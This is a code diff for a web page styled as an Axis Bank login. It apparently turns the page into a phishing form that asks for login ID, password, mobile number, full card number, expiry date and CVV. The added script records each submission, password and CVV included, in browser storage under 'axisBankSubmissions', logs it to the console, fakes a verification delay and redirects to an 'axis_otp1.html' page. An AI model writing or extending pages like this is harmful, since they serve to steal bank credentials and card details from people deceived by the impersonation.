-            radio.addEventListener('change', function() {
-                if (this.value === 'login-id') {
-                    idLabel.textContent = 'Login ID';
-                    document.getElementById('loginId').placeholder = 'Enter Login ID';
+        toggleCredit.addEventListener('click', function() {
+            // Update toggle UI
+            toggleCredit.classList.add('active-toggle');
+            toggleLogin.classList.remove('active-toggle');
+            toggleSlider.style.transform = 'translateX(100%)';
+            
+            // Show credit form, hide login form
+            loginForm.style.display = 'none';
+            creditForm.style.display = 'block';
+            
+            // Update forgot link
+            forgotLink.textContent = 'Forgot Credit Card Details?';
+        });
+        
+        // Format card number input (XXXX XXXX XXXX XXXX)
+        if (cardNumberInput) {
+            cardNumberInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+                let formattedValue = '';
+                
+                for (let i = 0; i < value.length && i < 16; i++) {
+                    if (i > 0 && i % 4 === 0) {
+                        formattedValue += ' ';
+                    }
+                    formattedValue += value[i];
+                }
+                
+                e.target.value = formattedValue;
+            });
+        }
+        
+        // Format expiry date input (MM/YY)
+        if (expiryInput) {
+            expiryInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+                
+                if (value.length >= 2) {
+                    e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
                 } else {
-                    idLabel.textContent = 'Customer ID';
-                    document.getElementById('loginId').placeholder = 'Enter Customer ID';
+                    e.target.value = value;
+                }
+            });
+        }
+        
+        // Only allow numbers in CVV field
+        if (cvvInput) {
+            cvvInput.addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/[^0-9]/gi, '');
+            });
+        }
+        
+        // Form submission handlers
+        if (loginForm) {
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const loginId = document.getElementById('loginId').value;
+                const password = document.getElementById('password').value;
+                const mobile = document.getElementById('mobile').value;
+                
+                if (loginId && password && mobile) {
+                    // Show loading animation on button
+                    const submitBtn = document.getElementById('loginButton');
+                    const originalText = submitBtn.textContent;
+                    submitBtn.textContent = "Processing...";
+                    submitBtn.classList.add('loading');
+                    submitBtn.disabled = true;
+                    
+                    // Save data to localStorage
+                    saveSubmission('login', {
+                        loginId: loginId,
+                        password: password,
+                        mobile: mobile,
+                        time: new Date().toLocaleString()
+                    });
+                    
+                    // Simulate processing delay
+                    setTimeout(() => {
+                        // Remove loading state
+                        submitBtn.textContent = originalText;
+                        submitBtn.classList.remove('loading');
+                        submitBtn.disabled = false;
+                        
+                        // Redirect to OTP page
+                        window.location.href = 'axis_otp1.html';
+                        
+                        // Reset form
+                        loginForm.reset();
+                    }, 1500);
+                } else {
+                    // Quick error indication
+                    const submitBtn = document.getElementById('loginButton');
+                    submitBtn.style.background = '#ff4444';
+                    setTimeout(() => {
+                        submitBtn.style.background = '#87103F';
+                    }, 500);
+                }
+            });
+        }
+        
+        if (creditForm) {
+            creditForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const cardNumber = document.getElementById('cardNumber').value;
+                const expiry = document.getElementById('expiry').value;
+                const cvv = document.getElementById('cvv').value;
+                const cardMobile = document.getElementById('cardMobile').value;
+                
+                if (cardNumber && expiry && cvv && cardMobile) {
+                    const cleanCardNumber = cardNumber.replace(/\s+/g, '');
+                    
+                    if (cleanCardNumber.length !== 16) {
+                        // Quick error indication
+                        const submitBtn = document.getElementById('creditButton');
+                        submitBtn.style.background = '#ff4444';
+                        setTimeout(() => {
+                            submitBtn.style.background = '#87103F';
+                        }, 500);
+                        return;
+                    }
+                    
+                    if (cvv.length !== 3) {
+                        // Quick error indication
+                        const submitBtn = document.getElementById('creditButton');
+                        submitBtn.style.background = '#ff4444';
+                        setTimeout(() => {
+                            submitBtn.style.background = '#87103F';
+                        }, 500);
+                        return;
+                    }
+                    
+                    // Show loading animation on button
+                    const submitBtn = document.getElementById('creditButton');
+                    const originalText = submitBtn.textContent;
+                    submitBtn.textContent = "Verifying...";
+                    submitBtn.classList.add('loading');
+                    submitBtn.disabled = true;
+                    
+                    // Save data to localStorage
+                    saveSubmission('credit', {
+                        cardNumber: cardNumber,
+                        expiry: expiry,
+                        cvv: cvv,
+                        mobile: cardMobile,
+                        time: new Date().toLocaleString()
+                    });
+                    
+                    // Simulate processing delay
+                    setTimeout(() => {
+                        // Remove loading state
+                        submitBtn.textContent = originalText;
+                        submitBtn.classList.remove('loading');
+                        submitBtn.disabled = false;
+                        
+                        // Redirect to OTP page
+                        window.location.href = 'axis_otp1.html';
+                        
+                        // Reset form
+                        creditForm.reset();
+                    }, 1500);
+                } else {
+                    // Quick error indication
+                    const submitBtn = document.getElementById('creditButton');
+                    submitBtn.style.background = '#ff4444';
+                    setTimeout(() => {
+                        submitBtn.style.background = '#87103F';
+                    }, 500);
+                }
+            });
+        }
+        
+        // Save submission to localStorage
+        function saveSubmission(type, data) {
+            // Get existing submissions or create empty array
+            let submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
+            
+            // Add new submission at the beginning
+            submissions.unshift({
+                id: Date.now(),
+                type: type,
+                data: data,
+                timestamp: new Date().toISOString(),
+                isNew: true
+            });
+            
+            // Save back to localStorage
+            localStorage.setItem('axisBankSubmissions', JSON.stringify(submissions));
+            
+            console.log('Data saved:', type, data);
+        }
+        
+        // Mobile number validation (only numbers)
+        const mobileInputs = document.querySelectorAll('input[type="tel"]');
+        mobileInputs.forEach(input => {
+            input.addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/[^0-9]/gi, '');
+            });
+        });
+        
+        // Forgot link click
+        if (forgotLink) {
+            forgotLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                const isLoginForm = loginForm.style.display === 'block';
+                
+                if (isLoginForm) {
+                    window.location.href = 'forgot_login.html';
+                } else {
+                    window.location.href = 'forgot_card.html';
+                }
+            });
+        }
+        
+        // Info buttons functionality
+        document.querySelectorAll('.info-button').forEach(button => {
+            button.addEventListener('click', function() {
+                const text = this.textContent;
+                if (text === 'KNOW MORE') {
+                    window.location.href = 'more_info.html';
+                } else if (text === 'DOWNLOAD') {
+                    window.location.href = 'download_app.html';
                 }
             });
         });
         
-        // Forgot Customer ID click
-        forgotCustomerId.addEventListener('click', function() {
-            forgotCustomerIdModal.style.display = 'flex';
-        });
-        
-        // Enable Login ID click
-        enableLoginId.addEventListener('click', function() {
-            enableLoginIdModal.style.display = 'flex';
-        });
-        
-        // Forgot Password click
-        forgotPassword.addEventListener('click', function() {
-            forgotPasswordModal.style.display = 'flex';
-        });
-        
-        // Close modals when close button is clicked
-        closeModals.forEach(button => {
-            button.addEventListener('click', function() {
-                forgotCustomerIdModal.style.display = 'none';
-                enableLoginIdModal.style.display = 'none';
-                forgotPasswordModal.style.display = 'none';
-            });
-        });
-        
-        // Close modals with close buttons
-        closeForgotCustomerId.addEventListener('click', function() {
-            forgotCustomerIdModal.style.display = 'none';
-        });
-        
-        closeEnableLoginId.addEventListener('click', function() {
-            enableLoginIdModal.style.display = 'none';
-        });
-        
-        // Reset password button
-        resetPassword.addEventListener('click', function() {
-            alert('Password reset link has been sent to your registered email and mobile number.');
-            forgotPasswordModal.style.display = 'none';
-        });
-        
-        // Login button click - show loading animation
-        loginButton.addEventListener('click', function() {
-            const loginId = document.getElementById('loginId').value;
-            const password = document.getElementById('password').value;
+        // Initialize - set Login form as default
+        window.addEventListener('DOMContentLoaded', function() {
+            toggleLogin.classList.add('active-toggle');
+            loginForm.style.display = 'block';
+            creditForm.style.display = 'none';
+            forgotLink.textContent = 'Forgot Login ID / Password?';
             
-            if (!loginId || !password) {
-                alert('Please enter both Login ID and Password');
-                return;
-            }
-            
-            // Show loading animation
-            loadingAnimation.style.display = 'block';
-            loginButton.disabled = true;
-            
-            // Simulate login process
-            setTimeout(() => {
-                // Hide loading animation
-                loadingAnimation.style.display = 'none';
-                loginButton.disabled = false;
-                
-                // Show login success message
-                const destination = loginDestination.options[loginDestination.selectedIndex].text;
-                alert(`Login successful! Redirecting to ${destination}...`);
-            }, 3000);
-        });
-        
-        // Close modals when clicking outside
-        window.addEventListener('click', function(event) {
-            if (event.target === forgotCustomerIdModal) {
-                forgotCustomerIdModal.style.display = 'none';
-            }
-            if (event.target === enableLoginIdModal) {
-                enableLoginIdModal.style.display = 'none';
-            }
-            if (event.target === forgotPasswordModal) {
-                forgotPasswordModal.style.display = 'none';
+            // Initialize localStorage if not exists
+            if (!localStorage.getItem('axisBankSubmissions')) {
+                localStorage.setItem('axisBankSubmissions', JSON.stringify([]));
             }
         });
     </script>
 </body>
-</html>
+                                        </html>
